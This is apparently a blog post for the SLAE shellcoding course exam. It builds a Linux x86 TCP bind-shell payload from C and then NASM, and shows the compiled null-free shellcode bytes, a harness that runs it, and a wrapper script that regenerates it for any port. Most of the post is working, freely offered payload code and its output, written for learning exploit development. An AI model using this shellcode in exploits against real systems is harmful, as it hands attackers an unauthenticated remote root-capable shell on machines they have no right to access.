I"OŽ<p>Student <strong>SLAE - 891</strong><br />
Github: <a href="https://github.com/phackt/slae">https://github.com/phackt/slae</a><br />
<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>

<p>Hello everybody,</p>

<p>Here we are for a new set of posts dealing with the exam of the great course <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">Assembly Language and Shellcoding on Linux</a>. Thanks to Vivek Ramachandran and his team for all of this work.<br />
<!--more--></p>

<p>For information, the SLAE course has been performed on a 32bits Kali environment:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># uname -a</span>
Linux kali 4.6.0-kali1-686 <span class="c">#1 SMP Debian 4.6.4-1kali1 (2016-07-21) i686 GNU/Linux</span>
</code></pre></div></div>

<p>We recommend to run the commands on a 32bits environment. Otherwise you should adapt them:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nasm <span class="nt">-f</span> elf32 <span class="nt">-o</span> <span class="nv">$1</span>.o <span class="nv">$1</span>.nasm
ld <span class="nt">-m</span> elf_i386 <span class="nt">-o</span> <span class="nv">$1</span> <span class="nv">$1</span>.o
gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-m32</span> <span class="nt">-o</span> shellcode shellcode.c
</code></pre></div></div>

<p>So letâ€™s rumble!</p>

<h3 id="assignment-1">Assignment 1:</h3>

<p>Code is available on my <a href="https://github.com/phackt/slae/tree/master/assignment1">github repo</a>.</p>

<p><strong>Our Goal:</strong></p>
<blockquote>
  <p><em>Create a Shell_Bind_TCP shellcode:</em></p>
  <ul>
    <li><em>binds to a port that should be easily configurable</em></li>
    <li><em>executes shell on incoming connection</em></li>
    <li><em>easily configure the listening port</em></li>
  </ul>
</blockquote>

<p>If we want to create a TCP Bind shellcode from scratch, what are our options?:</p>

<p><strong>1)</strong> The lazy one; creating a shellcode thanks to msfvenom</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> linux/x86/shell_bind_tcp <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="nv">EXITFUNC</span><span class="o">=</span>THREAD <span class="nt">-f</span> raw | ndisasm <span class="nt">-u</span> -
</code></pre></div></div>

<p>But it is quite too easy.</p>

<p><strong>2)</strong> Creating our own ELF thanks to a C program that will help to understand how the final shellcode will work.</p>

<p>We will choose this last option.</p>

<p>Here is our C source code:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
</span> 
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">dstport</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">mysockaddr</span><span class="p">;</span>
 
        <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 
        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span> <span class="c1">//2</span>
        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dstport</span><span class="p">);</span> <span class="c1">//8080</span>
        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span> <span class="c1">//0</span>
 
        <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">mysockaddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mysockaddr</span><span class="p">));</span>
 
        <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 
        <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
 
        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
 
        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Letâ€™s test it:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-ggdb</span> <span class="nt">-o</span> shell-bind-tcp shell-bind-tcp.c
./shell-bind-tcp


</code></pre></div></div>

<p>From another shell:<br />
<img src="http://localhost:4000/public/images/slae/assignment1/image1.png" alt="image1" /></p>

<p>The <code class="language-plaintext highlighter-rouge">objdump -d ./shell-bind-tcp -M intel</code> produces a huge amount of assembly code.<br />
Something good to notice is that our ELF has been dynamically linked:<br />
<img src="http://localhost:4000/public/images/slae/assignment1/image3.png" alt="image3" /></p>

<p>The ELF is using the .plt and .got sections in order to dynamically address the interesting functions.<br />
These functions are LIBC functions:<br />
<img src="http://localhost:4000/public/images/slae/assignment1/image2.png" alt="image2" /></p>

<p>We will need to translate these function calls into system calls. Letâ€™s focus on the following functions:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socket
bind
listen
accept
dup2
execve
</code></pre></div></div>

<p>Letâ€™s have a look in <strong>/usr/include/i386-linux-gnu/asm/unistd_32.h</strong>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
</code></pre></div></div>

<p>What is the syscall socketcall?</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 socketcall

SOCKETCALL<span class="o">(</span>2<span class="o">)</span>                                             Linux Programmer<span class="s1">'s Manual                                            SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common  kernel  entry point for the socket system calls.  call determines which socket function to invoke.  args
       points to a block containing the actual arguments, which are passed through to the appropriate call.

       User programs should call the appropriate functions by their usual names.  Only standard library implementors and kernel hackers need
       to know about socketcall().
...
</span></code></pre></div></div>

<p>Letâ€™s check the different values of the first <strong>int call</strong> argument:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep </span>SYS_ /usr/include/linux/net.h 
<span class="c">#define SYS_SOCKET   1             /* sys_socket(2)            */</span>
<span class="c">#define SYS_BIND     2             /* sys_bind(2)              */</span>
<span class="c">#define SYS_CONNECT  3             /* sys_connect(2)           */</span>
<span class="c">#define SYS_LISTEN   4             /* sys_listen(2)            */</span>
<span class="c">#define SYS_ACCEPT   5             /* sys_accept(2)            */</span>
<span class="c">#define SYS_GETSOCKNAME     6      /* sys_getsockname(2)       */</span>
<span class="c">#define SYS_GETPEERNAME     7      /* sys_getpeername(2)       */</span>
<span class="c">#define SYS_SOCKETPAIR      8      /* sys_socketpair(2)        */</span>
<span class="c">#define SYS_SEND     9             /* sys_send(2)              */</span>
<span class="c">#define SYS_RECV     10            /* sys_recv(2)              */</span>
<span class="c">#define SYS_SENDTO   11            /* sys_sendto(2)            */</span>
<span class="c">#define SYS_RECVFROM 12            /* sys_recvfrom(2)          */</span>
<span class="c">#define SYS_SHUTDOWN 13            /* sys_shutdown(2)          */</span>
<span class="c">#define SYS_SETSOCKOPT      14     /* sys_setsockopt(2)        */</span>
<span class="c">#define SYS_GETSOCKOPT      15     /* sys_getsockopt(2)        */</span>
<span class="c">#define SYS_SENDMSG  16            /* sys_sendmsg(2)           */</span>
<span class="c">#define SYS_RECVMSG  17            /* sys_recvmsg(2)           */</span>
<span class="c">#define SYS_ACCEPT4  18            /* sys_accept4(2)           */</span>
<span class="c">#define SYS_RECVMMSG 19            /* sys_recvmmsg(2)          */</span>
<span class="c">#define SYS_SENDMMSG 20            /* sys_sendmmsg(2)          */</span>
</code></pre></div></div>

<p>So letâ€™s dive into our shellcode:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; shell_bind_tcp.nasm</span>
<span class="c1">; </span>
<span class="c1">; A TCP port bind shellcode</span>
<span class="c1">;</span>
<span class="c1">; Author: SLAE - 891</span>
<span class="c1">;</span>
<span class="c1">; You are free to use and/or redistribute it without restriction</span>

<span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span>       <span class="nv">.text</span>
<span class="nl">_start:</span>

<span class="c1">; sockfd = socket(AF_INET, SOCK_STREAM, 0);</span>
<span class="c1">; int socketcall(int call, unsigned long *args);</span>
<span class="c1">; #define __NR_socketcall   102</span>
<span class="c1">; #define SYS_SOCKET        1</span>
       <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
       <span class="nf">mul</span> <span class="nb">ebx</span>              <span class="c1">; zero out eax and edx</span>
       <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>          <span class="c1">; __NR_socketcall</span>
       <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>            <span class="c1">; SYS_SOCKET</span>
       
       <span class="c1">; we are pushing on the stack our arguments</span>
       <span class="nf">push</span> <span class="nb">edx</span>             <span class="c1">; IPPROTO_IP</span>
       <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">1</span>          <span class="c1">; SOCK_STREAM</span>
       <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">2</span>          <span class="c1">; AF_INET</span>
       
       <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>         <span class="c1">; the top of the stack points to a structure of 3 arguments</span>
       <span class="nf">int</span> <span class="mh">0x80</span>             <span class="c1">; syscall - result is stored in eax</span>
       <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; stores sockfd</span>

<span class="c1">; bind(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(mysockaddr));</span>
<span class="c1">; int socketcall(int call, unsigned long *args);</span>
<span class="c1">; #define __NR_socketcall   102</span>
<span class="c1">; #define SYS_BIND                 2</span>
       <span class="nf">push</span> <span class="nb">edx</span>             <span class="c1">; mysockaddr.sin_addr.s_addr = INADDR_ANY; //0 - listen on 0.0.0.0 (all interfaces)</span>
       <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x901f</span>     <span class="c1">; mysockaddr.sin_port = htons(dstport); //8080</span>
       <span class="nf">push</span> <span class="kt">word</span> <span class="mi">2</span>          <span class="c1">; AF_INET</span>
       <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>         <span class="c1">; stores the address of mysockaddr</span>
       <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">16</span>         <span class="c1">; length of mysockaddr</span>
       <span class="nf">push</span> <span class="nb">ebx</span>             <span class="c1">; pointer to mysockaddr</span>
       <span class="nf">push</span> <span class="nb">edi</span>             <span class="c1">; sockfd</span>

       <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>         <span class="c1">; flushing registers</span>
       <span class="nf">mul</span> <span class="nb">ebx</span>
       <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>          <span class="c1">; __NR_socketcall</span>
       <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">2</span>            <span class="c1">; SYS_BIND</span>
       <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>         <span class="c1">; pointer to the args for socketcall</span>
       <span class="nf">int</span> <span class="mh">0x80</span>


<span class="c1">; listen(sockfd, 0);</span>
<span class="c1">; int socketcall(int call, unsigned long *args);</span>
<span class="c1">; #define __NR_socketcall   102</span>
<span class="c1">; #define SYS_LISTEN        4</span>
       <span class="nf">push</span> <span class="nb">edx</span>             <span class="c1">; 0</span>
       <span class="nf">push</span> <span class="nb">edi</span>             <span class="c1">; sockfd</span>
       <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>         <span class="c1">; flushing registers</span>
       <span class="nf">mul</span> <span class="nb">ebx</span>
       <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>          <span class="c1">; __NR_socketcall</span>
       <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">4</span>            <span class="c1">; SYS_LISTEN</span>
       <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>         <span class="c1">; pointer to the args for socketcall</span>
       <span class="nf">int</span> <span class="mh">0x80</span> 


<span class="c1">; clientfd = accept(sockfd, NULL, NULL);</span>
<span class="c1">; int socketcall(int call, unsigned long *args);</span>
<span class="c1">; #define __NR_socketcall   102</span>
<span class="c1">; #define SYS_ACCEPT        5</span>
       <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>         <span class="c1">; flushing registers</span>
       <span class="nf">mul</span> <span class="nb">ebx</span>

       <span class="nf">push</span> <span class="nb">edx</span>             <span class="c1">; NULL</span>
       <span class="nf">push</span> <span class="nb">edx</span>             <span class="c1">; NULL</span>
       <span class="nf">push</span> <span class="nb">edi</span>             <span class="c1">; sockfd</span>

       <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>          <span class="c1">; __NR_socketcall</span>
       <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">5</span>            <span class="c1">; SYS_ACCEPT</span>
       <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>         <span class="c1">; pointer to args</span>
       <span class="nf">int</span> <span class="mh">0x80</span>             <span class="c1">; returns clientfd file descriptor in eax</span>

<span class="c1">; int dup2(int oldfd, int newfd); duplicates a file descriptor</span>
<span class="c1">; dup2(clientfd, 0); </span>
<span class="c1">; dup2(clientfd, 1);</span>
<span class="c1">; dup2(clientfd, 2);</span>
<span class="c1">; #define __NR_dup2 63</span>

       <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; clientfd as first argument</span>
       <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
       <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">2</span>            <span class="c1">; 2 for stderr / 1 for stdout / 0 for stdin</span>
       <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>

<span class="nl">dup2:</span>
       <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">63</span>           <span class="c1">; __NR_dup2</span>
       <span class="nf">int</span> <span class="mh">0x80</span>
       <span class="nf">dec</span> <span class="nb">ecx</span>
       <span class="nf">jns</span> <span class="nv">dup2</span>             <span class="c1">; jump short if not signed </span>

<span class="c1">; execve("/bin/sh", NULL, NULL);</span>
<span class="c1">; #define __NR_execve 11</span>

       <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
       <span class="nf">push</span> <span class="nb">eax</span>
       <span class="nf">push</span> <span class="mh">0x68732f2f</span>      <span class="c1">; hs// - take care to the little endian representation</span>
       <span class="nf">push</span> <span class="mh">0x6e69622f</span>      <span class="c1">; nib/</span>
       <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>         <span class="c1">; pointer to command string</span>
       <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
       <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>
       <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>           <span class="c1">; __NR_execve</span>
       <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<p>Letâ€™s compile with the <a href="https://github.com/phackt/slae/blob/master/assignment1/compile.sh">compile.sh</a> script:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./compile.sh shell_bind_tcp
<span class="o">[</span>+] Assembling with Nasm ... 
<span class="o">[</span>+] Linking ...
<span class="o">[</span>+] Done!
</code></pre></div></div>

<p>Letâ€™s run shell_bind_tcp and try to connect from another shell:<br />
<img src="http://localhost:4000/public/images/slae/assignment1/image4.png" alt="image4" /></p>

<p>What we have to take care in shellcodes are bad characters. Each compromised application will lead to its own set of bad characters that we will need to avoid in the shellcode part of the exploit.  <br />
Right now letâ€™s check that our shellcode do not contain null bytes:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-d</span> shell_bind_tcp <span class="nt">-M</span> intel | <span class="nb">grep </span>00
</code></pre></div></div>

<p>Great, no null bytes. Letâ€™s dump our shellcode:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-d</span> ./shell_bind_tcp|grep <span class="s1">'[0-9a-f]:'</span>|grep <span class="nt">-v</span> <span class="s1">'file'</span>|cut <span class="nt">-f2</span> <span class="nt">-d</span>:|cut <span class="nt">-f1-6</span> <span class="nt">-d</span><span class="s1">' '</span>|tr <span class="nt">-s</span> <span class="s1">' '</span>|tr <span class="s1">'\t'</span> <span class="s1">' '</span>|sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span>|paste <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-s</span> |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
</code></pre></div></div>

<p>Letâ€™s execute it in <a href="https://github.com/phackt/slae/blob/master/assignment1/shellcode.c">shellcode.c</a>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-o</span> shellcode shellcode.c <span class="o">&amp;&amp;</span> ./shellcode
</code></pre></div></div>

<p>Then from another shell:<br />
<img src="http://localhost:4000/public/images/slae/assignment1/image5.png" alt="image5" /></p>

<p>One easy way to customize the listening port is to set a pattern in the source file and to generate the shellcode thanks to a wrapper script.<br />
We are creating a shell_bind_tcp.template and updating the following part:<br />
<code class="language-plaintext highlighter-rouge">push word 0x901f</code> becomes <code class="language-plaintext highlighter-rouge">push word PORT</code>.</p>

<p>Now we will use the <a href="https://github.com/phackt/slae/blob/master/assignment1/wrapper.sh">wrapper.sh</a> script:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./wrapper.sh
Usage: ./wrapper.sh &lt;port_number&gt; &lt;pattern&gt; &lt;file&gt;
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./wrapper.sh 8080 PORT ./shell_bind_tcp.template 
<span class="o">[</span>+] Assembling with Nasm ... 
<span class="o">[</span>+] Linking ...
<span class="o">[</span>+] Done!
<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
</code></pre></div></div>

<p>So now we can parametrize the port number and generate a TCP port binding shellcode.</p>

<p>Hope you enjoyed,<br />
Thanks a lot and as iâ€™m used to saying, do not hesitate to comment and share.</p>

<p><a href="https://twitter.com/phackt_ul">Phackt</a></p>

:ET